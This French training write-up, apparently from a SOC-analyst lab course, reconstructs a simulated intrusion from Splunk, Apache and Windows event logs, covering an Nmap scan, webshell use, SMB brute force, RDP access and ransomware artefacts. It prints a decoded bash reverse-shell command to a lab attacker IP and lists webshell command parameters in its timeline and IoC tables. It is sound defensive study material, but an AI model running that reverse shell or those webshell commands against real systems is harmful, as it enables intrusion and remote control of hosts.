@@ -1,0 +1,388 @@
+# Phase 7 - Analyse Forensique : Reconstituer l'Incident depuis les Logs
+
+**Environnement :** Home Lab virtuel sur Proxmox pour le projet Iron4Software - Formation Analyste SOC - CyberUniversity (Liora x Sorbonne).
+
+## Objectif du Lab
+
+La Phase 6 a permis de gérer l'incident INC-2026-001 dans l'urgence : contenir l'attaquant, éradiquer les artefacts malveillants, remettre les systèmes en production. Mais répondre à un incident ne suffit pas. Une fois la crise passée, une question reste entière : que s'est-il réellement passé, dans quel ordre, avec quels outils, et quelles preuves peut-on en apporter ?
+
+C'est l'objet de cette septième phase. Là où la Phase 6 adoptait la posture du pompier - stopper l'hémorragie en priorité - la Phase 7 s'occupe de reconstruire la chronologie exacte des événements, et produire un rapport de preuves qui pourrait tenir devant un tribunal ou un audit CNIL. L'analyse forensique est une discipline de précision : chaque affirmation doit être étayée par une source de log identifiée, chaque lacune doit être documentée et expliquée plutôt que dissimulée.
+
+La démarche adoptée suit le cadre **NIST SP 800-86** (Guide to Integrating Forensic Techniques into Incident Response), qui distingue la collecte des preuves, leur examen, leur analyse, et leur restitution. L'investigation procède par reconstruction chronologique ascendante : partir des alertes Splunk du 19 avril 2026 pour remonter jusqu'aux premières traces d'activité offensive du 07 mars 2026, source par source, artefact par artefact.
+
+Un principe guide toute cette phase : **un résultat négatif est une information forensique aussi importante qu'un résultat positif.** Documenter qu'on a cherché quelque chose et ne l'a pas trouvé délimite le périmètre de la compromission avec autant de rigueur que de documenter ce qu'on a trouvé.
+
+## Outils et Technologies
+
+- **SIEM :** Splunk Enterprise (licence Free - basculement via CLI `sudo /opt/splunk/bin/splunk restart`) - recherches SPL, corrélation d'Event ID, extraction de champs sur sourcetypes hétérogènes.
+- **Logs Apache :** `access.log`, `access.log.1`, `access.log.2.gz` sur Ubuntu Web - source primaire pour la phase de reconnaissance et les accès webshell.
+- **WinEventLog:Security :** Event ID 4624 (authentification réussie), 4625 (échec d'authentification), 4663 (accès objet audité) - source primaire pour le brute-force, la compromission et l'impact ransomware.
+- **Système de fichiers Ubuntu :** `/var/log/apache2/` - validation croisée des logs indexés par Splunk avec les fichiers sources sur disque.
+- **Framework MITRE ATT&CK :** T1595 (Active Scanning), T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell), T1110.001 (Brute Force - Password Guessing), T1078 (Valid Accounts), T1021.001 (Remote Desktop Protocol), T1048 (Exfiltration Over C2 Channel), T1486 (Data Encrypted for Impact).
+- **Référentiel forensique :** NIST SP 800-86 - Guide to Integrating Forensic Techniques into Incident Response.
+
+## 1. Préparation de l'Investigation : Sources et Angles Morts
+
+### A. Identification des sources de logs disponibles
+
+Avant toute requête, l'analyste forensique doit dresser la carte de ce qu'il a et de ce qu'il n'a pas. Lancer des requêtes à l'aveugle dans un SIEM sans connaître ses sources, c'est risquer de tirer des conclusions sur un silence qui n'est pas l'absence d'activité mais l'absence de journalisation.
+
+Trois sources sont disponibles pour cette investigation :
+
+| Source | Outil d'interrogation | Période couverte |
+|---|---|---|
+| Logs Apache (Splunk) | Splunk SPL - `sourcetype="access-too_small"` | 02/03/2026 - 08/03/2026 |
+| Logs Apache (disque) | `access.log.1` sur Ubuntu Web | 08/03/2026 |
+| WinEventLog:Security | Splunk SPL - `sourcetype="WinEventLog:Security"` | 07/03/2026 |
+| Logs pfSense (syslog) | Splunk SPL - `sourcetype="syslog"` | 19/04/2026 uniquement |
+
+### B. Audit des fichiers de logs Apache sur disque
+
+Avant d'interroger Splunk, je valide l'état des fichiers de logs sources directement sur la VM Ubuntu Web. Cette étape est fondamentale en forensique : Splunk indexe ce que les agents lui transmettent, mais les fichiers sources constituent la preuve primaire.
+
+```bash
+cat /var/log/apache2/access.log | grep "192.168.50.5"
+ls -lh /var/log/apache2/
+```
+
+![Ubuntu Web - ls -lh /var/log/apache2/ montrant la structure complète des fichiers de rotation](../Extras/Phase7/1.png)
+
+La sortie révèle une information critique pour l'investigation :
+
+- `access.log` : 0 octet, daté du 22 juin 15h15 - fichier vide, recréé après la suppression du webshell en Phase 6
+- `access.log.1` : 520 octets, daté du **08 mars 14h37** - contient les logs du 08/03
+- `access.log.2.gz` : 462 octets, daté du **07 mars 10h09** - archivé en compression, mais le test de lecture confirme qu'il est vide côté contenu utile
+- `access.log.3.gz` : 255 octets, daté du 04 mars - logs de setup
+- `access.log.4.gz` : 321 octets, daté du 02 mars - logs de setup
+
+La rotation automatique d'Apache a écrasé les logs du 07/03 sur le disque. `access.log.2.gz` existe physiquement mais son contenu correspond à la rotation ayant eu lieu à 10h09 le 07/03, soit avant les premières commandes webshell de 10h03. **Splunk est donc la seule source disponible pour les logs Apache du 07 mars 2026.**
+
+> **Analyse :**
+> Ce constat est une leçon forensique concrète sur la valeur irremplaçable du SIEM comme système de préservation des preuves. Les logs sur disque sont par nature volatils : la rotation automatique, les purges planifiées, ou simplement une réinstallation du service peuvent les effacer. Splunk, en indexant les événements au fil de l'eau, crée une copie préservée indépendante du cycle de vie des fichiers sources. C'est l'argument fondamental en faveur d'une architecture de logs centralisée dans tout environnement de production : les logs locaux des serveurs ne sont pas des preuves forensiques fiables, ils sont des sources de collecte.
+
+### C. Identification des angles morts de journalisation
+
+La cartographie des sources disponibles révèle trois lacunes structurelles qui borneront ce que l'investigation peut prouver avec certitude :
+
+**Angle mort 1 - Event ID 4663 absents pour le 07/03/2026.** La requête suivante retourne zéro résultat pour la période de l'attaque réelle :
+
+```spl
+index=main sourcetype="WinEventLog:Security" EventCode=4663 earliest="03/07/2026:00:00:00" latest="03/08/2026:23:59:59"
+| table _time, Nom_du_compte, "Nom de l'objet"
+| sort _time
+```
+
+![Splunk - 0 résultats pour Event ID 4663 sur la période 07/03-08/03/2026](../Extras/Phase7/2.png)
+
+L'audit NTFS sur le dossier PRIVATE n'était pas encore configuré lors de l'attaque initiale - il a été mis en place lors du durcissement post-Phase 2. Conséquence directe : aucune trace directe dans les logs de l'accès aux fichiers, de l'exfiltration du Dump SQL, ni du dépôt des artefacts ransomware pendant la session RDP du 07/03/2026.
+
+**Angle mort 2 - Event ID 4672 absents.** L'audit des privilèges spéciaux à l'ouverture de session n'était pas configuré sur le Windows Server 2019 à la date de l'attaque. Aucun Event ID 4672 ne peut donc attester des droits effectivement attribués à l'attaquant lors de la session RDP.
+
+**Angle mort 3 - Logs pfSense absents pour le 07/03.** La requête `index=main sourcetype="syslog" "192.168.50.5"` filtrée sur la période du 07/03 ne retourne aucun résultat. Les règles de logging pfSense vers Splunk ont été mises en place lors de la Phase 4 de supervision, postérieure à l'attaque. Aucune trace réseau du scan Nmap ni du trafic SMB/RDP de l'attaquant n'est disponible pour la période de l'incident.
+
+> **Contexte SOC & Blue Team :**
+> La documentation des angles morts n'est pas un aveu d'échec de l'investigation, c'est une obligation de rigueur. Un rapport forensique qui omet de mentionner les lacunes de journalisation est un rapport trompeur : il donne l'impression d'avoir tout inspecté alors que des pans entiers de l'activité attaquante sont invisibles. En situation réelle, ces lacunes sont aussi des recommandations implicites : chaque angle mort documenté dans ce rapport est un argument concret en faveur d'une amélioration de la couverture de journalisation.
+
+## 2. Analyse Forensique des Logs Apache : Reconstruction de l'Accès Initial
+
+### A. Reconstruction de la phase de reconnaissance (07/03/2026 09h19)
+
+Je filtre les logs Apache sur l'IP Kali pour la journée du 07 mars, en partant du plus ancien :
+
+```spl
+index=main sourcetype="access-too_small"
+| sort _time
+| table _time, _raw
+```
+
+![Splunk - Logs Apache raw - début du scan Nmap 07/03/2026 09h19:03, premières requêtes OPTIONS](../Extras/Phase7/3.png)
+
+![Splunk - Logs Apache raw - suite du scan Nmap, requêtes HBPT, evox/about, HNAP1, GET /](../Extras/Phase7/4.png)
+
+![Splunk - Logs Apache raw - fin du scan Nmap, nmaplowercheck, robots.txt, GET / 09h19:25](../Extras/Phase7/5.png)
+
+Les raw events restituent une séquence très précise :
+
+- **09h19:03** : `GET / HTTP/1.0` sans User-Agent depuis `192.168.50.5` - premier contact, sondage minimal
+- **09h19:17 à 09h19:18** : rafale de requêtes en moins de deux secondes depuis `192.168.50.5`, User-Agent `Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)` - méthodes `OPTIONS`, `PROPFIND`, `HBPT`, requêtes `GET /favicon.ico`, `GET /.git/HEAD`, `GET /robots.txt`, `GET /nmaplowercheck1772871557`, `GET /evox/about`, `GET /HNAP1`, `POST /sdk`, `POST /`
+- **09h19:25** : deux `GET /` supplémentaires sans User-Agent, clôture du scan
+
+C'est le scan `nmap -A` avec scripts NSE HTTP. La rafale de 09h19:17 est la signature caractéristique des scripts `http-methods`, `http-auth-finder` et `http-enum` de Nmap qui tentent d'énumérer les méthodes HTTP autorisées et de détecter des endpoints vulnérables connus. La requête `GET /nmaplowercheck1772871557` est un identifiant aléatoire que Nmap génère pour détecter si le serveur retourne des pages personnalisées pour toute requête - une technique de fingerprinting applicatif.
+
+> **Contexte SOC & Blue Team :**
+> Le User-Agent `Nmap Scripting Engine` est un IoC de niveau 1 : il identifie non seulement l'outil utilisé mais aussi l'intention (reconnaissance active). Une règle de détection Splunk ciblant ce User-Agent dans les logs Apache aurait déclenché une alerte 44 minutes avant la première exploitation du webshell, soit assez tôt pour qu'un analyste SOC intervienne et coupe l'accès avant tout compromission. La requête `GET /nmaplowercheck[random]` est également une signature détectable par regex : tout GET vers un chemin correspondant à `/nmaplowercheck[0-9]{10}` est une empreinte Nmap NSE avec une probabilité proche de 100%.
+
+### B. Reconstruction des sessions webshell (07/03 et 08/03)
+
+Je filtre maintenant spécifiquement sur les accès au webshell `shell.php` :
+
+```spl
+index=main sourcetype="access-too_small" shell.php
+| table _time, cmd
+| sort _time
+```
+
+![Splunk - Timeline des commandes webshell cmd= du 07/03 et 08/03, avec reverse shell URL-encodé](../Extras/Phase7/6.png)
+
+La timeline des commandes webshell révèle deux sessions distinctes :
+
+**Session 1 - 07/03/2026 (44 minutes après le scan Nmap) :**
+
+| Horodatage | Commande | Bytes de réponse | Interprétation |
+|---|---|---|---|
+| 10h03:33 | `whoami` | 156 | Identification du contexte d'exécution du webshell |
+| 10h04:00 | `ip a` | 876 | Enumération complète des interfaces réseau d'Ubuntu Web |
+| 10h09:55 | `ping -c 2 192.168.3.10` | 499 | Test de joignabilité du Windows Server depuis Ubuntu Web |
+
+**Session 2 - 08/03/2026 (reprise le lendemain) :**
+
+| Horodatage | Commande | Bytes de réponse | Interprétation |
+|---|---|---|---|
+| 09h05:10 | `whoami` | 156 | Vérification que le webshell est toujours actif |
+| 09h05:15 | `ip a` | 876 | Re-énumération réseau |
+| 09h05:22 | `ping -c 2 192.168.3.10` | 499 | Re-confirmation de joignabilité |
+| 09h51:24 | Reverse shell bash | 147 | Escalade vers shell interactif complet |
+
+La commande du 08/03 à 09h51:24 est URL-encodée dans les logs : `bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.50.5/4444%200%3E%261%22`. Une fois décodée, elle donne :
+
+```bash
+bash -c "bash -i >& /dev/tcp/192.168.50.5/4444 0>&1"
+```
+
+C'est un reverse shell bash classique qui établit une connexion TCP sortante depuis Ubuntu Web vers `192.168.50.5` sur le port `4444`, en redirigeant stdin, stdout et stderr dans ce tunnel. A partir de cet instant, l'attaquant dispose d'un shell interactif complet qui ne laisse plus aucune trace dans `access.log`.
+
+> **Analyse :**
+> La taille de réponse `147 bytes` pour le reverse shell (contre `156 bytes` pour `whoami`) est forensiquement significative. Le processus `bash` a démarré et a commencé à répondre avant que la connexion TCP vers `192.168.50.5:4444` soit entièrement établie, ce qui explique la réponse tronquée. Cette différence de taille est une signature comportementale : si une alerte était configurée sur les réponses de taille anormalement basse (< 150 bytes) depuis `shell.php`, le reverse shell aurait pu être détecté en temps réel. Après 09h51:24, le silence dans `access.log` est lui-même une information : l'attaquant n'a plus besoin du webshell, il a son propre canal de commande.
+
+### C. Validation croisée avec les logs Apache sur disque
+
+Je valide la cohérence des logs Splunk avec les fichiers sources sur la VM Ubuntu Web :
+
+```bash
+cat /var/log/apache2/access.log.1 | grep "192.168.50.5"
+```
+
+![Ubuntu Web - cat access.log.1 - 4 entrées du 08/03 depuis 192.168.50.5 confirmant la cohérence avec Splunk](../Extras/Phase7/7.png)
+
+Les quatre entrées du 08/03 sont présentes en clair sur le disque et sont identiques à ce que Splunk a indexé. La cohérence entre la source primaire (fichier disque) et la source secondaire (index Splunk) est confirmée. Splunk n'a introduit aucune distorsion dans l'indexation de ces événements.
+
+> **Contexte SOC & Blue Team :**
+> Cette étape de validation croisée est ce qui distingue une investigation forensique rigoureuse d'une simple consultation de SIEM. En production, un SIEM peut avoir des délais d'indexation, des erreurs de parsing, ou des événements manquants si le Universal Forwarder a été hors ligne. La règle de l'analyste forensique est toujours de vérifier la source primaire quand elle est disponible. Ici, la cohérence est parfaite, ce qui valide Splunk comme source de confiance pour les logs du 07/03 dont les fichiers disque ont été écrasés par la rotation Apache.
+
+## 3. Analyse Forensique des Event ID Windows : Reconstruction du Brute-Force et de la Compromission
+
+### A. Identification et comptage des tentatives d'authentification échouées (Event ID 4625)
+
+Le brute-force SMB laisse une empreinte très caractéristique dans les journaux Windows. Je cherche tous les Event ID 4625 provenant de l'IP Kali :
+
+```spl
+index=main sourcetype="WinEventLog:Security" EventCode=4625 "192.168.50.5"
+| table _time, Nom_du_compte, "Adresse du réseau source", "Type d'ouverture de session", ComputerName
+| sort _time
+```
+
+![Splunk - Event ID 4625 x67 - début du brute-force 07/03/2026 11h06:29, page 1/4](../Extras/Phase7/8.png)
+
+![Splunk - Event ID 4625 x67 - fin du brute-force 07/03/2026 11h49:00/11h49:01, page 4/4](../Extras/Phase7/9.png)
+
+La requête retourne **67 événements**, tous présentant les mêmes caractéristiques :
+
+- Compte ciblé : `Administrateur`
+- Source réseau : `192.168.50.5`
+- Type d'ouverture de session : `3` (Network Logon - authentification réseau via SMB)
+- Machine cible : `WIN-HKVM4FR00PS`
+- Période : **07/03/2026 de 11h06:29 à 11h49:01**
+- Durée totale : **42 minutes**
+- Cadence : plusieurs tentatives par seconde (4 événements à 11h06:29, confirmant une attaque automatisée)
+
+La cadence de plusieurs tentatives par seconde est la signature comportementale de CrackMapExec en mode brute-force SMB. Un humain ne peut pas taper des mots de passe à cette fréquence. L'analyse des timestamps montre que le taux d'échecs est régulier sur toute la durée, sans pause, ce qui confirme l'automatisation complète de l'attaque.
+
+> **Analyse :**
+> Le nombre 67 est un chiffre forensiquement utile. CrackMapExec, en configuration standard, teste les mots de passe depuis une liste dans l'ordre séquentiel. 67 tentatives sur une wordlist standard signifie que le mot de passe `Admin123` se trouvait en position 67 (ou environs) de la liste utilisée par l'attaquant. C'est une information sur la qualité du mot de passe : `Admin123` est suffisamment courant pour figurer dans les premières pages de toute wordlist de pentest standard. La politique de mot de passe aurait dû rejeter ce mot de passe à la création du compte.
+
+### B. Identification des sondes SMB anonymes intercalées
+
+Parallèlement aux 4625, une requête sur les 4624 depuis la même IP révèle une séquence intéressante :
+
+```spl
+index=main sourcetype="WinEventLog:Security" EventCode=4624 "192.168.50.5"
+| table _time, Nom_du_compte, "Adresse du réseau source", Type_d_ouverture_de_session, ComputerName
+| sort _time
+```
+
+![Splunk - Event ID 4624 x6 - séquence ANONYMOUS LOGON x3, compromission 11h49:01, session RDP 12h11:00/12h11:03](../Extras/Phase7/10.png)
+
+La requête retourne **6 événements** qui racontent à eux seuls toute la séquence de compromission :
+
+| Horodatage | Compte | Type | Signification |
+|---|---|---|---|
+| 11h24:56 | ANONYMOUS LOGON | 3 | Sonde SMB anonyme CrackMapExec - test de connectivité |
+| 11h33:36 | ANONYMOUS LOGON | 3 | Deuxième sonde - relance de la série |
+| 11h06:29 à 11h49:01 | Administrateur | 3 | 67 tentatives d'échec (4625 non représentés ici) |
+| 11h48:59 | ANONYMOUS LOGON | 3 | Troisième sonde juste avant la fin du brute-force |
+| **11h49:01** | **Administrateur** | **3** | **COMPROMISSION - mot de passe Admin123 trouvé** |
+| 12h11:00 | Administrateur | 3 | Authentification réseau préalable à l'ouverture RDP |
+| **12h11:03** | **WIN-HKVM4FR00PS$** | **10** | **SESSION RDP ÉTABLIE - accès graphique complet** |
+
+Les trois `ANONYMOUS LOGON` sont la signature spécifique de CrackMapExec : avant chaque série de tentatives d'authentification avec des credentials, l'outil envoie une sonde anonyme pour vérifier la connectivité SMB. Ces sondes génèrent des Event ID 4624 (succès) car une connexion SMB anonyme réussit techniquement même sans credentials valides - c'est simplement une connexion sans authentification.
+
+> **Contexte SOC & Blue Team :**
+> La combinaison `ANONYMOUS LOGON (4624 Type 3) + rafale de 4625 Type 3 + retour d'ANONYMOUS LOGON` depuis la même IP est la signature forensique la plus caractéristique d'un brute-force CrackMapExec. Un analyste qui ne voit que les 4625 pourrait suspecter un test de configuration légitime. En corrélant avec les 4624 ANONYMOUS LOGON qui encadrent la série, l'attribution à CrackMapExec devient certaine. C'est ce que font les bons moteurs de corrélation SIEM : non pas alerter sur des événements isolés, mais sur des séquences comportementales.
+
+### C. Analyse forensique de la session RDP (12h11:03)
+
+La transition de l'Event ID 4624 Type 3 à 12h11:00 vers le Type 10 à 12h11:03 mérite une analyse précise. Le **Type 10** correspond à un `RemoteInteractive Logon` - c'est la signature exacte d'une ouverture de session RDP.
+
+Ce qui est forensiquement remarquable c'est le compte impliqué : `WIN-HKVM4FR00PS$`. Le signe dollar final indique qu'il s'agit du **compte machine** (computer account) et non d'un compte utilisateur. Lors d'une session RDP, le protocole exige que la machine cible s'authentifie auprès d'elle-même via Kerberos pour établir la session graphique. Ce comportement est normal et attendu pour toute connexion RDP légitime - mais c'est également la preuve que la session RDP a bien été établie avec succès depuis `192.168.50.5`.
+
+La séquence Type 3 puis Type 10 en 3 secondes est la signature forensique canonique de l'ouverture d'une session RDP : le Type 3 correspond à la phase d'authentification réseau (validation des credentials), le Type 10 à l'établissement effectif de la session graphique interactive. Les deux événements sont indissociables et constituent ensemble la preuve d'un accès RDP.
+
+> **Analyse :**
+> A partir de 12h11:03, l'attaquant dispose d'un accès graphique complet au Windows Server 2019 avec les droits du compte `Administrateur`. Ce qui se passe ensuite - l'exfiltration du Dump SQL et le dépôt des artefacts ransomware - échappe totalement à la journalisation disponible, faute d'audit NTFS actif à cette date. C'est l'angle mort le plus critique de cette investigation : les conséquences les plus graves de l'incident (violation de données de santé, impact sur les fichiers sensibles) ne laissent aucune trace vérifiable dans les logs. La seule preuve directe disponible est le résultat observé lors de la Phase 6 : les artefacts ransomware présents dans le dossier PRIVATE, datés du 07/03/2026, période cohérente avec la session RDP de 12h11.
+
+### D. Vérification de l'absence de logs pfSense pour la période de l'attaque
+
+La dernière source à interroger est le syslog pfSense. La requête filtrée sur la période d'attaque confirme l'angle mort préidentifié :
+
+```spl
+index=main sourcetype="syslog" "192.168.50.5" earliest="03/07/2026:00:00:00" latest="03/08/2026:23:59:59"
+| table _time, _raw
+| sort _time
+```
+
+![](../Extras/Phase7/20.png)
+
+Zéro résultat. Les 2203 events syslog présents dans Splunk datent tous du 19/04/2026 et correspondent aux alertes de la Phase 4, postérieures à l'incident. La surface réseau de l'attaque du 07/03 est invisible depuis pfSense.
+
+## 4. Reconstitution Forensique de la Kill Chain Complète
+
+### A. Timeline forensique consolidée
+
+L'ensemble des événements identifiés et vérifiés source par source peut maintenant être restitué dans une timeline unique, avec pour chaque événement son horodatage, sa source de preuve, et sa technique MITRE ATT&CK correspondante.
+
+Les événements du 02/03 (tests de setup depuis `192.168.3.10` et `192.168.3.2`) sont volontairement exclus de cette timeline : ils constituent du bruit de laboratoire sans valeur forensique pour la reconstitution de l'incident.
+
+| Horodatage | Source | Technique MITRE | Événement |
+|---|---|---|---|
+| 07/03 09h19:03 | Apache Splunk | T1595 - Reconnaissance | Premier contact Kali (`192.168.50.5`) vers le serveur web - `GET / HTTP/1.0` sans User-Agent |
+| 07/03 09h19:17-18 | Apache Splunk | T1595.002 - Active Scanning | Scan Nmap NSE HTTP - rafale de requêtes `OPTIONS`, `PROPFIND`, `HBPT`, `GET /.git/HEAD`, `GET /nmaplowercheck1772871557` - UA : Nmap Scripting Engine |
+| 07/03 09h19:25 | Apache Splunk | T1595 - Fin reconnaissance | Deux `GET /` sans User-Agent - clôture du scan |
+| 07/03 10h03:33 | Apache Splunk | T1190 - Exploit Public App | Premier accès webshell - `GET /shell.php?cmd=whoami` - 156 bytes - `curl/8.11.0` |
+| 07/03 10h04:00 | Apache Splunk | T1059 - Command Interpreter | `GET /shell.php?cmd=ip+a` - 876 bytes - énumération réseau |
+| 07/03 10h09:55 | Apache Splunk | T1016 - Network Discovery | `GET /shell.php?cmd=ping+-c+2+192.168.3.10` - 499 bytes - confirmation pivot vers WS2019 |
+| 07/03 11h24:56 | WinEventLog 4624 | T1110 - Brute Force (sonde) | ANONYMOUS LOGON Type 3 depuis `192.168.50.5` - première sonde SMB CrackMapExec |
+| 07/03 11h06:29 | WinEventLog 4625 | T1110.001 - Password Guessing | Début du brute-force SMB - 67 tentatives sur le compte `Administrateur` depuis `192.168.50.5` |
+| 07/03 11h33:36 | WinEventLog 4624 | T1110 - Brute Force (sonde) | ANONYMOUS LOGON Type 3 - deuxième sonde SMB CrackMapExec |
+| 07/03 11h48:59 | WinEventLog 4624 | T1110 - Brute Force (sonde) | ANONYMOUS LOGON Type 3 - troisième sonde avant fin brute-force |
+| **07/03 11h49:01** | **WinEventLog 4624** | **T1078 - Valid Accounts** | **COMPROMISSION - `Administrateur` Type 3 depuis `192.168.50.5` - mot de passe `Admin123` trouvé** |
+| 07/03 12h11:00 | WinEventLog 4624 | T1021.001 - RDP (auth) | `Administrateur` Type 3 depuis `192.168.50.5` - authentification réseau préalable à l'ouverture RDP |
+| **07/03 12h11:03** | **WinEventLog 4624** | **T1021.001 - RDP (session)** | **SESSION RDP ÉTABLIE - `WIN-HKVM4FR00PS$` Type 10 depuis `192.168.50.5` - accès graphique complet** |
+| 07/03 post-12h11 | Déduction | T1048 - Exfiltration | Exfiltration de `Dump_SQL_IronSuite_Clinique_StJean_PROD.bak` via presse-papiers RDP (non loggé - audit NTFS inactif) |
+| 07/03 post-12h11 | Déduction | T1486 - Data Encrypted | Dépôt `LOCKED-Dump_SQL_IronSuite_Clinique_StJean_PROD.bak` et `PAY-BITCOIN!.txt` dans PRIVATE (non loggé - audit NTFS inactif) |
+| 08/03 09h05:10 | Apache Splunk | T1190 - Maintain Access | Reprise de session webshell - `whoami` - vérification de persistance |
+| 08/03 09h05:15 | Apache Splunk | T1016 | `ip a` - re-énumération réseau |
+| 08/03 09h05:22 | Apache Splunk | T1016 | `ping -c 2 192.168.3.10` - re-confirmation joignabilité |
+| **08/03 09h51:24** | **Apache Splunk + access.log.1** | **T1059.004 - Unix Shell** | **Reverse shell bash vers `192.168.50.5:4444` - escalade vers shell interactif** |
+| 19/04 14h20 | Splunk Triggered Alerts | Détection | 133 alertes Critical déclenchées - ouverture INC-2026-001 |
+
+### B. Indicateurs de Compromission (IoC) formalisés
+
+L'investigation produit un inventaire complet des IoC, classés par catégorie et directement exploitables pour alimenter des règles de détection ou une notification CNIL :
+
+**IoC réseau :**
+
+| Type | Valeur | Source de détection |
+|---|---|---|
+| IP attaquante | `192.168.50.5` | Logs Apache + WinEventLog:Security |
+| Port C2 | TCP/4444 | Logs Apache - cmd reverse shell bash |
+| User-Agent scanner | `Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)` | Logs Apache |
+| User-Agent exploitation | `curl/8.11.0` | Logs Apache |
+
+**IoC système - fichiers :**
+
+| Type | Valeur | Localisation |
+|---|---|---|
+| Webshell | `/var/www/html/shell.php` | Ubuntu Web (192.168.3.11) |
+| Fichier exfiltré | `Dump_SQL_IronSuite_Clinique_StJean_PROD.bak` | C:\PRIVATE - NE PAS RENTRER ! |
+| Artefact ransomware | `LOCKED-Dump_SQL_IronSuite_Clinique_StJean_PROD.bak` | C:\PRIVATE - NE PAS RENTRER ! |
+| Note de rançon | `PAY-BITCOIN!.txt` | C:\PRIVATE - NE PAS RENTRER ! |
+
+**IoC comportementaux - Event ID Windows :**
+
+| Event ID | Volume | Pattern | Interprétation |
+|---|---|---|---|
+| 4625 | 67 events | Type 3 - `192.168.50.5` - 42 min | Brute-force SMB automatisé CrackMapExec |
+| 4624 | 3 events | ANONYMOUS LOGON Type 3 - `192.168.50.5` | Sondes connectivité SMB CrackMapExec |
+| 4624 | 1 event | `Administrateur` Type 3 - 11h49:01 | Compromission du compte - succès brute-force |
+| 4624 | 2 events | Type 3 + Type 10 - 12h11 | Etablissement session RDP interactive |
+
+**IoC comportementaux - Logs Apache :**
+
+| Pattern | Valeur | Signification |
+|---|---|---|
+| URL webshell | `/shell.php?cmd=[commande]` | Exécution de commandes système via webshell GET |
+| Commandes RCE | `cmd=whoami`, `cmd=ip+a` | Énumération post-exploitation |
+| Commande pivot | `cmd=ping+-c+2+192.168.3.10` | Vérification joignabilité cible interne |
+| Reverse shell | `bash -i >& /dev/tcp/192.168.50.5/4444 0>&1` | Escalade vers shell interactif |
+| Endpoint scan | `/nmaplowercheck[random]`, `GET /.git/HEAD` | Scripts NSE HTTP Nmap |
+
+### C. Ce que l'investigation ne peut pas prouver
+
+L'honnêteté forensique impose de distinguer ce qui est prouvé par les logs, ce qui est établi par déduction, et ce qui reste indémontrable :
+
+**Prouvé par les logs :**
+- La phase de reconnaissance Nmap (07/03 09h19) - logs Apache Splunk
+- Les commandes webshell des 07/03 et 08/03 - logs Apache Splunk et access.log.1
+- Le brute-force SMB et sa durée (07/03 11h06-11h49) - 67 Event ID 4625
+- La compromission du compte Administrateur (07/03 11h49:01) - Event ID 4624 Type 3
+- L'établissement de la session RDP (07/03 12h11:03) - Event ID 4624 Type 10
+- Le reverse shell bash (08/03 09h51:24) - logs Apache Splunk et access.log.1
+
+**Établi par déduction mais non prouvé par les logs de Phase 2 :**
+- L'exfiltration du Dump SQL - cohérente avec la session RDP et confirmée comme schéma par les Event ID 4663 du 24/04/2026, mais absente des logs de Phase 2
+- Le dépôt des artefacts ransomware dans PRIVATE - même situation
+
+**Indémontrable depuis les logs disponibles :**
+- Les commandes exactes exécutées pendant la session RDP (aucun log de commande shell Windows, pas d'audit de processus 4688, pas de PowerShell logging)
+- Le volume exact de données exfiltrées
+- Si d'autres fichiers ont été accédés en dehors de PRIVATE
+
+> **Contexte SOC & Blue Team :**
+> Cette distinction entre "prouvé", "déduit" et "indémontrable" est ce qui sépare un rapport forensique d'un témoignage. Un analyste forensique qui présente des déductions comme des preuves s'expose à voir son rapport contesté ou invalidé en procédure judiciaire. La valeur probatoire d'un rapport tient à sa rigueur épistémique, pas à son exhaustivité apparente. Documenter honnêtement les limites de l'investigation renforce sa crédibilité plutôt que de la diminuer.
+
+## 5. Bilan de l'Investigation Forensique
+
+### Tableau comparatif : Posture Phase 6 vs Phase 7
+
+| Dimension | Phase 6 - Réponse à Incident | Phase 7 - Analyse Forensique |
+|---|---|---|
+| **Posture** | Pompier - stopper l'hémorragie | Médecin légiste - autopsier la blessure |
+| **Temporalité** | Temps réel - urgence opérationnelle | Post-incident - reconstruction à tête reposée |
+| **Objectif logs** | Triage : identifier les systèmes compromis | Reconstruction : prouver chaque étape de l'attaque |
+| **Précision requise** | Suffisante pour agir | Maximale - valeur probatoire |
+| **Traitement des lacunes** | Contournement opérationnel | Documentation et explication |
+| **Livrable** | Fiche Incident + Playbook IR | Rapport forensique + IoC formalisés |
+
+### Fenêtre d'exposition et enseignements
+
+La donnée la plus marquante de cette investigation n'est pas technique, c'est temporelle. La compromission initiale date du **07 mars 2026**. La première alerte SOC date du **19 avril 2026**. Soit **43 jours** pendant lesquels l'attaquant a eu accès à l'infrastructure sans qu'aucun mécanisme de détection ne déclenche.
+
+Pendant ces 43 jours, l'attaquant a :
+- Maintenu un webshell fonctionnel sur Ubuntu Web
+- Exfiltré des données de santé appartenant à la Clinique St-Jean
+- Déposé des artefacts ransomware sur le Windows Server
+
+L'investigation forensique confirme que cette fenêtre n'est pas due à une défaillance de détection, mais à une absence de détection : aucune règle ne surveillait l'activité webshell en temps réel, et les Event ID 4625 qui enregistraient le brute-force n'étaient pas encore corrélés dans des alertes Splunk.
+
+## Implications pour un Analyste SOC
+
+**La forensique commence avant l'incident.** Les angles morts de cette investigation - absence de 4663, de 4672, de logs pfSense pour la période de l'attaque - ne sont pas des accidents. Ils sont le résultat de décisions d'architecture qui ont précédé l'incident. Un analyste SOC qui comprend la forensique sait que chaque absence de journalisation est un futur angle mort d'investigation. Configurer l'audit NTFS, activer les Event ID de politique d'audit, mettre en place le logging pfSense : tout cela se décide avant l'incident, quand il est encore temps.
+
+**La valeur des logs Apache GET comme preuve.** Les commandes webshell ont été exécutées via méthode GET délibérément, ce qui les a inscrites en clair dans `access.log`. En production, de nombreux webshells utilisent POST pour éviter ce type de journalisation. Le choix de GET dans ce lab a fourni une mine d'informations forensiques : les commandes exactes, les horodatages précis, les tailles de réponse. En environnement réel, un analyste forensique doit savoir que les logs Apache GET ne représentent qu'une fraction de l'activité webshell possible.
+
+**La reconstruction temporelle comme discipline.** La timeline forensique produite dans cette phase n'est pas une synthèse des connaissances acquises pendant les phases d'attaque - c'est une reconstruction depuis les sources de logs, indépendante de ce qui a été documenté offensivement. Cette discipline est fondamentale : en situation réelle, l'analyste forensique n'a pas accès aux notes de l'attaquant. Il reconstruit uniquement depuis les traces laissées. Le fait que les deux perspectives - offensive et forensique - convergent vers la même chronologie est la preuve que les logs étaient suffisamment riches pour reconstituer l'incident sans biais de confirmation.
+
